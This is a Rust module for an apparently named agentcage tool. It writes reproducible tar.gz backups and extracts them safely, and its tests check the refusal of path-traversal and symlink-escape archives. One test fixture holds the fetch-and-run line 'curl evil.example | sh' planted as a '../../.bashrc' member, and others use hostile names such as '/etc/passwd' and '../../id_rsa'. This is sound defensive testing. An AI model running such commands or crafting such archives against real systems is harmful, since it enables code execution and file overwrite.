//! The backup container format: a gzipped tar, written deterministically
//! and read defensively.
//!
//! # Why this is a module and not four lines at a call site
//!
//! `cage backup` and `cage restore` (`cli.py:3349`, `cli.py:3467`) are
//! the only two commands whose payload is an *archive*, and an archive
//! is the one artifact in this program that arrives from outside it.
//! Everything else the Rust binary reads was written by agentcage on
//! the same machine; a tarball is handed over by a person, copied off a
//! dead laptop, or fetched from wherever a backup was kept. So the two
//! directions have opposite jobs, and they are separated here:
//!
//! * **Writing** ([`write_targz`]) has to be *reproducible*. Neither
//!   half of a `.tar.gz` is deterministic by default — the gzip header
//!   carries an mtime and the original filename, and every tar member
//!   carries an mtime, a uid, a gid, a uname, a gname and whatever mode
//!   the producing host's umask happened to make it. PR A7 hit exactly
//!   this while building the committed fixture and had to normalize all
//!   of it afterwards (`scripts/gen-state-fixtures.py:867`, which notes
//!   that running the generator under `umask 077` changed every byte of
//!   the archive). Rather than write a per-run archive and normalize it,
//!   this writes the normalized form in the first place.
//!
//! * **Reading** ([`extract_into`]) has to be *safe*. A tar member's
//!   name is an arbitrary string, and the classic attack is a member
//!   called `../../.bashrc`: a naive extractor joins it to the
//!   destination and writes outside. Symlinks are the same bug with a
//!   second step — a member `link -> /home/luca` followed by a member
//!   `link/.bashrc` escapes even an extractor that checked the first
//!   name. Both are refused here, by name and by link target, before
//!   anything is created.
//!
//!   Symlinks are *carried*, not banned outright, because a cage's
//!   staged build context is an operator's directory and really does
//!   contain them. What is banned is a link that leaves the tree
//!   ([`link_stays_inside`]), which is the same line `tarfile`'s `data`
//!   filter draws. Links are re-created, never followed, so a dangling
//!   one is harmless.
//!
//! # What the Python does about traversal, and whether it is safe
//!
//! `cli.py:3543` calls `tar.extractall(tmpdir, filter="data")`. The
//! `data` filter is PEP 706's, and it is the strict one: it rejects
//! absolute paths and `..` components, rejects links whose target
//! escapes the destination, rejects device and FIFO members, and strips
//! setuid/setgid/sticky bits. `pyproject.toml` declares
//! `requires-python = ">=3.12"`, where the parameter exists and the
//! filter is implemented, so **the Python is safe** — not by accident
//! but by an explicit opt-in, since 3.12's default for `extractall` is
//! still the permissive `fully_trusted` behavior with a
//! `DeprecationWarning`. This module reproduces the same guarantees
//! rather than inheriting them, because Rust's `tar` crate has no
//! equivalent knob: its `Archive::unpack` silently *skips* an escaping
//! member, which restores a backup that is quietly missing a file.
//! Here that is an error with the member's name in it.
//!
//! # Reproducibility, stated precisely
//!
//! Two [`write_targz`] calls with equal member lists produce equal
//! bytes, on any machine, under any umask, at any time. What this does
//! *not* claim is byte-equality with the Python's `tarfile` output:
//! `tarfile` writes its own header spellings and zlib's deflate differs
//! from `miniz_oxide`'s. The contract PR D2 pinned is the member list
//! and the member contents (`state_compat.rs:1418`), and that is what
//! is reproduced.

use std::fs;
use std::io::{self, Read as _, Write as _};
use std::os::unix::fs::PermissionsExt as _;
use std::path::{Component, Path, PathBuf};

/// One archive member.
///
/// Directories are explicit rather than implied by their children's
/// names, because the Python's `tar.add(dir, recursive=True)` emits
/// them and the pinned member list contains all four of them —
/// `capture/`, `config/`, `secrets/` and an *empty* `volumes/`. An
/// empty directory that carried no member would vanish from the
/// archive, and `volumes/` is empty in the committed fixture.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Member {
    /// A directory entry, named without a trailing slash.
    Dir(String),
    /// A regular file and its contents.
    File(String, Vec<u8>),
    /// A regular file whose contents are read from disk when the
    /// archive is written.
    ///
    /// Not a convenience: an exported podman volume and a long-lived
    /// `capture.jsonl` are both unbounded, and holding either in memory
    /// to hand it to [`Member::File`] would make a backup's peak memory
    /// the size of what it is backing up.
    FileFrom(String, PathBuf),
    /// A symbolic link, and the target it points at verbatim.
    ///
    /// Only links that stay inside the archive are expressible: the
    /// caller is expected to have dropped the rest ([`link_stays_inside`]
    /// is the same judgement [`extract_into`] applies on the way back),
    /// because a link to an absolute path is host content a backup must
    /// not carry and is refused by every safe extractor there is.
    ///
    /// A cage's state dir really does contain links — a staged build
    /// context is an operator's directory — and the alternative to
    /// carrying them is dereferencing them, which copies whatever they
    /// point at into the tarball.
    Symlink(String, String),
}

impl Member {
    /// The member's name inside the archive.
    #[must_use]
    pub fn name(&self) -> &str {
        match self {
            Self::Dir(name)
            | Self::File(name, _)
            | Self::FileFrom(name, _)
            | Self::Symlink(name, _) => name,
        }
    }
}

/// What can go wrong reading an archive someone else produced.
#[derive(Debug)]
pub enum ArchiveError {
    /// The file could not be read, or the gzip/tar stream ended early
    /// or did not decode. A truncated backup lands here.
    Io(io::Error),
    /// A member's name would have escaped the destination directory.
    UnsafePath(String),
    /// A symlink member whose *target* escapes the destination
    /// directory — absolute, or climbing out with `..`. The name is
    /// innocent; following the link is what writes outside.
    UnsafeLink {
        /// The member's name, as the archive spells it.
        name: String,
        /// Where it pointed.
        target: String,
    },
    /// A member is not a regular file, a directory or a symlink — a
    /// hard link, a device node or a FIFO.
    UnsupportedEntry {
        /// The member's name, as the archive spells it.
        name: String,
        /// What it claimed to be.
        kind: String,
    },
}

impl std::fmt::Display for ArchiveError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Io(error) => write!(f, "{error}"),
            Self::UnsafePath(name) => write!(
                f,
                "archive member {name:?} would extract outside the destination directory"
            ),
            Self::UnsafeLink { name, target } => write!(
                f,
                "archive member {name:?} is a symbolic link to {target:?}, \
                 which is outside the destination directory"
            ),
            Self::UnsupportedEntry { name, kind } => write!(
                f,
                "archive member {name:?} is a {kind}; only regular files, \
                 directories and symbolic links are restored"
            ),
        }
    }
}

impl std::error::Error for ArchiveError {}

impl From<io::Error> for ArchiveError {
    fn from(error: io::Error) -> Self {
        Self::Io(error)
    }
}

/// The mode every extracted and archived file gets.
///
/// Not the source file's mode. A cage's state directory holds
/// `creds/*.cred` at 0600 and `cage.yaml` at whatever the operator's
/// umask produced, and carrying those through would make the archive
/// depend on the producing host — A7's normalizer exists because that
/// is exactly what happened. Nothing reads a member's mode on restore:
/// `save_deployment` copies the file into place and the state layer
/// decides the permissions there.
const FILE_MODE: u32 = 0o644;

/// The mode every archived directory gets. See [`FILE_MODE`].
const DIR_MODE: u32 = 0o755;

/// The mode every archived symlink gets. See [`FILE_MODE`]; this one is
/// `0o777` because that is what a symlink's inode carries everywhere
/// and what `tarfile` writes.
const LINK_MODE: u32 = 0o777;

/// Extracted files are the operator's alone: a backup made with
/// `--include-secrets` has bare credentials in it, and it is unpacked
/// into a directory under `$TMPDIR`, which is usually world-traversable.
const EXTRACT_FILE_MODE: u32 = 0o600;

/// As [`EXTRACT_FILE_MODE`], for the directories that hold them.
const EXTRACT_DIR_MODE: u32 = 0o700;

/// Write `members` to `dest` as a gzipped tar, reproducibly.
///
/// Members are sorted by name, so the caller need not be careful about
/// the order it collected them in — and so a directory always precedes
/// its children, since a name is a prefix of everything under it.
///
/// # Errors
///
/// [`io::Error`] if `dest` cannot be created or written.
pub fn write_targz(dest: &Path, members: &[Member]) -> io::Result<()> {
    let mut sorted: Vec<&Member> = members.iter().collect();
    sorted.sort_by(|left, right| left.name().cmp(right.name()));

    let mut tar = tar::Builder::new(Vec::new());
    for member in sorted {
        let mut header = tar::Header::new_gnu();
        // Every per-host field, pinned. `new_gnu` leaves uname/gname
        // empty already; setting them is not redundant so much as it is
        // the place a reader looks to see that they were considered.
        header.set_mtime(0);
        header.set_uid(0);
        header.set_gid(0);
        header.set_username("")?;
        header.set_groupname("")?;
        match member {
            Member::Dir(name) => {
                header.set_entry_type(tar::EntryType::Directory);
                header.set_mode(DIR_MODE);
                header.set_size(0);
                // The trailing slash is how tar spells a directory in
                // the name field, and it is what `tar -tzf` prints.
                tar.append_data(&mut header, format!("{name}/"), io::empty())?;
            }
            Member::File(name, data) => {
                header.set_entry_type(tar::EntryType::Regular);
                header.set_mode(FILE_MODE);
                header.set_size(data.len() as u64);
                tar.append_data(&mut header, name, data.as_slice())?;
            }
            Member::FileFrom(name, source) => {
                let mut file = fs::File::open(source)?;
                header.set_entry_type(tar::EntryType::Regular);
                header.set_mode(FILE_MODE);
                header.set_size(file.metadata()?.len());
                tar.append_data(&mut header, name, &mut file)?;
            }
            Member::Symlink(name, target) => {
                header.set_entry_type(tar::EntryType::Symlink);
                // A link's own mode is not a thing any filesystem this
                // runs on honours, but the field is in the header and
                // an unset one would be whatever `new_gnu` left there.
                header.set_mode(LINK_MODE);
                header.set_size(0);
                tar.append_link(&mut header, name, target)?;
            }
        }
    }
    let raw = tar.into_inner()?;

    if let Some(parent) = dest.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent)?;
        }
    }
    let file = fs::File::create(dest)?;
    // `mtime(0)` and no filename: the two fields a gzip header carries
    // that have nothing to do with the data. Without both, the same
    // archive written twice differs in its first ten bytes.
    let mut gz = flate2::GzBuilder::new()
        .mtime(0)
        .write(file, flate2::Compression::default());
    gz.write_all(&raw)?;
    gz.finish()?.flush()?;
    Ok(())
}

/// Read one member's bytes out of a gzipped tar, by exact name.
///
/// `Ok(None)` means the archive was readable and had no such member —
/// which is how a backup with no `manifest.json` is distinguished from
/// one that is not an archive at all.
///
/// # Errors
///
/// [`ArchiveError::Io`] if the file cannot be opened, is not gzip, or
/// the stream ends inside a member.
pub fn read_member(tarball: &Path, name: &str) -> Result<Option<Vec<u8>>, ArchiveError> {
    let mut archive = open(tarball)?;
    for entry in archive.entries()? {
        let mut entry = entry?;
        let entry_name = entry_name(&entry);
        if entry_name == name {
            let mut data = Vec::new();
            entry.read_to_end(&mut data)?;
            return Ok(Some(data));
        }
    }
    Ok(None)
}

/// Every member name in the archive, in stream order.
///
/// Used by `cage restore` only to report what it found when something
/// required is missing; nothing branches on it.
///
/// # Errors
///
/// As [`read_member`].
pub fn member_names(tarball: &Path) -> Result<Vec<String>, ArchiveError> {
    let mut archive = open(tarball)?;
    let mut names = Vec::new();
    for entry in archive.entries()? {
        names.push(entry_name(&entry?));
    }
    Ok(names)
}

/// Unpack `tarball` into `dest`, refusing anything that could write
/// outside it.
///
/// The rules, all of which are `tarfile`'s `data` filter and none of
/// which the `tar` crate applies on its own:
///
/// * a member name must be relative, with no `..` and no root;
/// * a member must be a regular file, a directory or a symlink — never
///   a hard link, a device node or a FIFO;
/// * a symlink's *target* must be relative and must still land under
///   `dest` when resolved from the link's own directory. This is the
///   one rule that is about where a member *points* rather than where
///   it is written, and it is the second half of the traversal attack:
///   a member `link -> /home/luca` followed by a member `link/.bashrc`
///   escapes an extractor that only checked names. Links that pass are
///   re-created as links, never followed — so a *dangling* one is
///   fine, and a backup's staged build context keeps its shape;
/// * the resolved path must still be under `dest` after joining, which
///   catches anything the name check did not think of.
///
/// A violation is an error naming the member, not a skip. The
/// difference matters: `Archive::unpack` skips, and a restore that
/// quietly dropped `config/cage.yaml` because a hostile member shared
/// its name would be worse than one that refused.
///
/// Permissions come from here, not from the archive: files 0600,
/// directories 0700. See [`EXTRACT_FILE_MODE`].
///
/// # Errors
///
/// [`ArchiveError`] on an unreadable, truncated or hostile archive, or
/// if `dest` cannot be written.
pub fn extract_into(tarball: &Path, dest: &Path) -> Result<(), ArchiveError> {
    let mut archive = open(tarball)?;
    fs::create_dir_all(dest)?;
    for entry in archive.entries()? {
        let mut entry = entry?;
        let name = entry_name(&entry);
        let kind = entry.header().entry_type();
        if !(kind.is_file() || kind.is_dir() || kind.is_symlink()) {
            return Err(ArchiveError::UnsupportedEntry {
                name,
                kind: describe(kind),
            });
        }
        let relative = safe_relative_path(&name)?;
        let link_to = if kind.is_symlink() {
            let raw = entry
                .link_name_bytes()
                .ok_or_else(|| ArchiveError::UnsafeLink {
                    name: name.clone(),
                    target: String::new(),
                })?;
            Some(String::from_utf8_lossy(&raw).into_owned())
        } else {
            None
        };
        let target = dest.join(&relative);
        // Belt and braces. `safe_relative_path` has already rejected
        // every component that could climb, so this can only fire if
        // that function is wrong — which is the case worth catching.
        if !target.starts_with(dest) {
            return Err(ArchiveError::UnsafePath(name));
        }
        if kind.is_dir() {
            fs::create_dir_all(&target)?;
            fs::set_permissions(&target, fs::Permissions::from_mode(EXTRACT_DIR_MODE))?;
            continue;
        }
        if let Some(parent) = target.parent() {
            fs::create_dir_all(parent)?;
            fs::set_permissions(parent, fs::Permissions::from_mode(EXTRACT_DIR_MODE))?;
        }
        if let Some(link_to) = link_to {
            if !link_stays_inside(&relative, &link_to) {
                return Err(ArchiveError::UnsafeLink {
                    name,
                    target: link_to,
                });
            }
            // An archive may name the same path twice; the last one
            // wins, as it does for a regular file, and `symlink` will
            // not overwrite.
            if fs::symlink_metadata(&target).is_ok() {
                fs::remove_file(&target)?;
            }
            std::os::unix::fs::symlink(&link_to, &target)?;
            continue;
        }
        let mut file = fs::File::create(&target)?;
        fs::set_permissions(&target, fs::Permissions::from_mode(EXTRACT_FILE_MODE))?;
        io::copy(&mut entry, &mut file)?;
        file.flush()?;
    }
    Ok(())
}

/// Open the gzip stream and wrap it in a tar reader.
fn open(tarball: &Path) -> Result<tar::Archive<flate2::read::GzDecoder<fs::File>>, ArchiveError> {
    let file = fs::File::open(tarball)?;
    Ok(tar::Archive::new(flate2::read::GzDecoder::new(file)))
}

/// A member's name, with the trailing slash tar puts on directories
/// removed so both halves of this module agree on one spelling.
fn entry_name<R: io::Read>(entry: &tar::Entry<'_, R>) -> String {
    // `path_bytes`, not `path()`: a member name is a byte string and a
    // non-UTF-8 one must still be *reportable*, not an early return
    // that loses which member was at fault. Lossy decoding cannot
    // introduce a `..` or a `/` that was not there, and
    // `safe_relative_path` judges the result either way.
    let raw = entry.path_bytes();
    let text = String::from_utf8_lossy(&raw).into_owned();
    text.trim_end_matches('/').to_owned()
}

/// Reject `..`, absolute paths and anything else that is not a plain
/// relative path, then hand back what is left.
fn safe_relative_path(name: &str) -> Result<PathBuf, ArchiveError> {
    if name.is_empty() {
        return Err(ArchiveError::UnsafePath(name.to_owned()));
    }
    // Checked on the string as well as on the parsed components: a
    // name is a byte string chosen by whoever wrote the archive, and
    // the two checks fail differently on input a single one would
    // normalize away.
    if name.starts_with('/') || name.contains('\0') {
        return Err(ArchiveError::UnsafePath(name.to_owned()));
    }
    let mut out = PathBuf::new();
    for component in Path::new(name).components() {
        match component {
            Component::Normal(part) => out.push(part),
            // `./x` is harmless and `tarfile` accepts it.
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(ArchiveError::UnsafePath(name.to_owned()));
            }
        }
    }
    if out.as_os_str().is_empty() {
        return Err(ArchiveError::UnsafePath(name.to_owned()));
    }
    Ok(out)
}

/// Does a symlink at `name` pointing at `target` stay inside the tree
/// `name` is relative to?
///
/// `name` is the link's path *relative to the root* — the extraction
/// destination when reading, the cage's state dir when writing — and
/// `target` is the link's contents verbatim. Both halves of a backup
/// ask this same question, which is why it lives here and is public:
/// `cage backup` drops the links that fail so the archive it writes is
/// one [`extract_into`] will accept, and `extract_into` asks again
/// because an archive it did not write may say anything.
///
/// The walk is lexical, not `canonicalize`: the answer must not depend
/// on what happens to exist on this host, and when writing, the file
/// the link points at need not exist at all — a dangling link inside
/// the tree is portable and is carried.
#[must_use]
pub fn link_stays_inside(name: &Path, target: &str) -> bool {
    if target.is_empty() || Path::new(target).is_absolute() {
        return false;
    }
    // Start from the link's own directory, as the kernel would.
    let mut depth: usize = name.parent().map_or(0, |parent| {
        parent
            .components()
            .filter(|c| matches!(c, Component::Normal(_)))
            .count()
    });
    for component in Path::new(target).components() {
        match component {
            Component::Normal(_) => depth += 1,
            Component::CurDir => {}
            Component::ParentDir => match depth.checked_sub(1) {
                Some(next) => depth = next,
                // Climbed past the root: the link points outside.
                None => return false,
            },
            Component::RootDir | Component::Prefix(_) => return false,
        }
    }
    true
}

/// A human name for an entry type, for the refusal message.
fn describe(kind: tar::EntryType) -> String {
    match kind {
        tar::EntryType::Symlink => "symbolic link".to_owned(),
        tar::EntryType::Link => "hard link".to_owned(),
        tar::EntryType::Char => "character device".to_owned(),
        tar::EntryType::Block => "block device".to_owned(),
        tar::EntryType::Fifo => "FIFO".to_owned(),
        other => format!("{other:?} entry"),
    }
}

#[cfg(test)]
mod tests {
    use super::{ArchiveError, Member, extract_into, member_names, read_member, write_targz};
    use agentcage_state::TestDir;
    use std::fs;
    use std::io::Write as _;
    use std::os::unix::fs::PermissionsExt as _;

    fn members() -> Vec<Member> {
        vec![
            Member::File("agentcage-backup/manifest.json".into(), b"{}\n".to_vec()),
            Member::Dir("agentcage-backup/config".into()),
            Member::File(
                "agentcage-backup/config/cage.yaml".into(),
                b"name: x\n".to_vec(),
            ),
            Member::Dir("agentcage-backup/volumes".into()),
        ]
    }

    /// The claim the module doc makes, tested rather than asserted:
    /// same input, same bytes.
    #[test]
    fn two_writes_of_the_same_members_are_byte_identical() {
        let dir = TestDir::new("archive-determinism");
        let first = dir.join("a.tar.gz");
        let second = dir.join("b.tar.gz");
        write_targz(&first, &members()).unwrap();
        // A different collection order must not change the output.
        let mut shuffled = members();
        shuffled.reverse();
        write_targz(&second, &shuffled).unwrap();
        assert_eq!(fs::read(&first).unwrap(), fs::read(&second).unwrap());
    }

    /// The gzip header's mtime is the field that would otherwise make
    /// the previous test pass only within the same second.
    #[test]
    fn the_gzip_header_carries_no_timestamp_and_no_filename() {
        let dir = TestDir::new("archive-gzhdr");
        let path = dir.join("x.tar.gz");
        write_targz(&path, &members()).unwrap();
        let bytes = fs::read(&path).unwrap();
        assert_eq!(&bytes[0..2], &[0x1f, 0x8b], "gzip magic");
        // FLG byte: FNAME is bit 3.
        assert_eq!(bytes[3] & 0b0000_1000, 0, "FNAME must not be set");
        assert_eq!(&bytes[4..8], &[0, 0, 0, 0], "MTIME must be zero");
    }

    /// Directories come out with a trailing slash and sort ahead of
    /// their children, which is the order the pinned fixture listing is
    /// in.
    #[test]
    fn members_are_sorted_and_directories_keep_their_slash() {
        let dir = TestDir::new("archive-order");
        let path = dir.join("x.tar.gz");
        write_targz(&path, &members()).unwrap();
        assert_eq!(
            member_names(&path).unwrap(),
            [
                "agentcage-backup/config",
                "agentcage-backup/config/cage.yaml",
                "agentcage-backup/manifest.json",
                "agentcage-backup/volumes",
            ]
        );
    }

    #[test]
    fn a_member_can_be_read_back_by_name() {
        let dir = TestDir::new("archive-read");
        let path = dir.join("x.tar.gz");
        write_targz(&path, &members()).unwrap();
        assert_eq!(
            read_member(&path, "agentcage-backup/config/cage.yaml").unwrap(),
            Some(b"name: x\n".to_vec())
        );
        assert_eq!(read_member(&path, "nope").unwrap(), None);
    }

    #[test]
    fn a_round_trip_lands_the_same_bytes_with_tight_permissions() {
        let dir = TestDir::new("archive-roundtrip");
        let path = dir.join("x.tar.gz");
        write_targz(&path, &members()).unwrap();
        let out = dir.join("out");
        extract_into(&path, &out).unwrap();
        assert_eq!(
            fs::read(out.join("agentcage-backup/config/cage.yaml")).unwrap(),
            b"name: x\n"
        );
        assert!(out.join("agentcage-backup/volumes").is_dir());
        let mode = fs::metadata(out.join("agentcage-backup/manifest.json"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600);
        let dir_mode = fs::metadata(out.join("agentcage-backup/config"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(dir_mode, 0o700);
    }

    /// Write an archive holding one member whose name is planted
    /// directly in the header.
    ///
    /// `tar::Header::set_path` refuses both `..` and a leading `/`,
    /// which is a fine thing for a *writer* to do and says nothing
    /// about the reader. A hostile archive is not produced by this
    /// crate, so the name goes into the 100-byte name field by hand.
    fn plant(path: &std::path::Path, name: &str, data: &[u8]) {
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Regular);
        header.set_mode(0o644);
        header.set_mtime(0);
        header.set_size(data.len() as u64);
        let field = &mut header.as_gnu_mut().unwrap().name;
        field[..name.len()].copy_from_slice(name.as_bytes());
        header.set_cksum();
        let mut builder = tar::Builder::new(Vec::new());
        builder.append(&header, data).unwrap();
        let raw = builder.into_inner().unwrap();
        let mut gz = flate2::GzBuilder::new().mtime(0).write(
            fs::File::create(path).unwrap(),
            flate2::Compression::default(),
        );
        gz.write_all(&raw).unwrap();
        gz.finish().unwrap();
    }

    /// The classic one. `tar` the crate would skip this member on
    /// `unpack`; here it is a named refusal, and nothing is written.
    #[test]
    fn a_traversing_member_is_refused_by_name() {
        let dir = TestDir::new("archive-traversal");
        let path = dir.join("evil.tar.gz");
        plant(&path, "../../.bashrc", b"curl evil.example | sh\n");
        let out = dir.join("out");
        let error = extract_into(&path, &out).unwrap_err();
        assert!(
            matches!(&error, ArchiveError::UnsafePath(name) if name == "../../.bashrc"),
            "{error:?}"
        );
        assert!(!dir.join(".bashrc").exists());
        assert!(!dir.path().parent().unwrap().join(".bashrc").exists());
    }

    /// The same escape wearing the `agentcage-backup/` prefix a
    /// restore expects, so the prefix is not mistaken for a defense.
    #[test]
    fn a_traversal_hidden_behind_the_expected_prefix_is_refused() {
        let dir = TestDir::new("archive-traversal-prefix");
        let path = dir.join("evil.tar.gz");
        plant(&path, "agentcage-backup/../../escaped", b"nope\n");
        let error = extract_into(&path, &dir.join("out")).unwrap_err();
        assert!(matches!(&error, ArchiveError::UnsafePath(_)), "{error:?}");
        assert!(!dir.path().parent().unwrap().join("escaped").exists());
    }

    /// The same bug spelled with a leading `/`, which joins to an
    /// absolute path rather than climbing.
    #[test]
    fn an_absolute_member_is_refused() {
        let dir = TestDir::new("archive-absolute");
        let path = dir.join("evil.tar.gz");
        plant(&path, "/etc/passwd", b"hi\n");
        let error = extract_into(&path, &dir.join("out")).unwrap_err();
        assert!(
            matches!(&error, ArchiveError::UnsafePath(name) if name == "/etc/passwd"),
            "{error:?}"
        );
    }

    /// Write an archive holding one symlink member, target and all.
    fn plant_link(path: &std::path::Path, name: &str, target: &str) {
        let mut builder = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_mode(0o777);
        header.set_mtime(0);
        header.set_size(0);
        builder.append_link(&mut header, name, target).unwrap();
        let raw = builder.into_inner().unwrap();
        let mut gz = flate2::GzBuilder::new().mtime(0).write(
            fs::File::create(path).unwrap(),
            flate2::Compression::default(),
        );
        gz.write_all(&raw).unwrap();
        gz.finish().unwrap();
    }

    /// A symlink member is the second step of the traversal attack: the
    /// link name itself is innocent, and the member after it walks
    /// through the link. An absolute target is the blunt version.
    #[test]
    fn a_symlink_member_pointing_outside_is_refused() {
        let dir = TestDir::new("archive-symlink");
        let path = dir.join("evil.tar.gz");
        plant_link(&path, "agentcage-backup/escape", "/tmp");

        let error = extract_into(&path, &dir.join("out")).unwrap_err();
        assert!(
            matches!(
                &error,
                ArchiveError::UnsafeLink { name, target }
                    if name == "agentcage-backup/escape" && target == "/tmp"
            ),
            "{error:?}"
        );
        assert!(!dir.join("out/agentcage-backup/escape").exists());
    }

    /// The same escape spelled relatively, which no check on the
    /// member's *name* would ever see.
    #[test]
    fn a_symlink_member_that_climbs_out_is_refused() {
        let dir = TestDir::new("archive-symlink-climb");
        let path = dir.join("evil.tar.gz");
        plant_link(&path, "agentcage-backup/config/escape", "../../../../etc");

        let error = extract_into(&path, &dir.join("out")).unwrap_err();
        assert!(
            matches!(&error, ArchiveError::UnsafeLink { target, .. } if target == "../../../../etc"),
            "{error:?}"
        );
    }

    /// The other half: a link that stays inside is carried and restored
    /// *as a link*, not as a copy of what it points at. A cage's staged
    /// build context really does contain these, and a backup that
    /// flattened them would change what the rebuild sees.
    #[test]
    fn an_in_tree_symlink_round_trips_as_a_link() {
        let dir = TestDir::new("archive-symlink-ok");
        let path = dir.join("x.tar.gz");
        write_targz(
            &path,
            &[
                Member::Dir("agentcage-backup/config".into()),
                Member::Dir("agentcage-backup/config/skills".into()),
                Member::File(
                    "agentcage-backup/config/skills/tool.py".into(),
                    b"print('hi')\n".to_vec(),
                ),
                // A sibling, and one that climbs but lands inside.
                Member::Symlink(
                    "agentcage-backup/config/skills/alias.py".into(),
                    "tool.py".into(),
                ),
                Member::Symlink(
                    "agentcage-backup/config/skills/up.py".into(),
                    "../skills/tool.py".into(),
                ),
                // Dangling, and therefore fine: nothing is followed.
                Member::Symlink(
                    "agentcage-backup/config/dangling".into(),
                    "nowhere.txt".into(),
                ),
            ],
        )
        .unwrap();

        let out = dir.join("out");
        extract_into(&path, &out).unwrap();
        let config = out.join("agentcage-backup/config");
        for link in ["skills/alias.py", "skills/up.py", "dangling"] {
            assert!(
                fs::symlink_metadata(config.join(link))
                    .unwrap()
                    .is_symlink(),
                "{link} must come back as a link"
            );
        }
        assert_eq!(
            fs::read_link(config.join("skills/alias.py")).unwrap(),
            std::path::Path::new("tool.py")
        );
        // Following it lands on the real file, which is the point.
        assert_eq!(
            fs::read_to_string(config.join("skills/alias.py")).unwrap(),
            "print('hi')\n"
        );
        assert!(!config.join("dangling").exists(), "still dangling");
    }

    /// The containment rule both halves of a backup ask, on its own.
    #[test]
    fn link_containment_is_judged_from_the_links_own_directory() {
        use super::link_stays_inside;
        use std::path::Path;

        assert!(link_stays_inside(Path::new("skills/alias.py"), "tool.py"));
        assert!(link_stays_inside(Path::new("dangling"), "nowhere.txt"));
        assert!(link_stays_inside(Path::new("a/b/link"), "../c/d"));
        assert!(link_stays_inside(Path::new("a/link"), "./x"));
        // Climbs exactly to the root, then back in.
        assert!(link_stays_inside(Path::new("a/link"), "../a/x"));

        assert!(!link_stays_inside(Path::new("host-link"), "/etc/passwd"));
        assert!(!link_stays_inside(Path::new("link"), "../x"));
        assert!(!link_stays_inside(
            Path::new("skills/escape"),
            "../../id_rsa"
        ));
        assert!(!link_stays_inside(Path::new("a/b/link"), "../../../x"));
        assert!(!link_stays_inside(Path::new("link"), ""));
    }

    /// A half-copied backup: the gzip stream ends inside a member. It
    /// has to be an error, not a panic and not a silent short read.
    #[test]
    fn a_truncated_archive_is_an_io_error() {
        let dir = TestDir::new("archive-truncated");
        let path = dir.join("x.tar.gz");
        write_targz(
            &path,
            &[Member::File(
                "agentcage-backup/manifest.json".into(),
                vec![b'x'; 200_000],
            )],
        )
        .unwrap();
        let whole = fs::read(&path).unwrap();
        let cut = dir.join("cut.tar.gz");
        fs::write(&cut, &whole[..whole.len() / 2]).unwrap();

        let error = read_member(&cut, "agentcage-backup/manifest.json").unwrap_err();
        assert!(matches!(error, ArchiveError::Io(_)), "{error:?}");
        let error = extract_into(&cut, &dir.join("out")).unwrap_err();
        assert!(matches!(error, ArchiveError::Io(_)), "{error:?}");
    }

    /// Not gzip at all.
    #[test]
    fn a_non_archive_is_an_io_error() {
        let dir = TestDir::new("archive-garbage");
        let path = dir.join("x.tar.gz");
        fs::write(&path, b"this is not a tarball").unwrap();
        assert!(matches!(
            read_member(&path, "anything").unwrap_err(),
            ArchiveError::Io(_)
        ));
    }
}
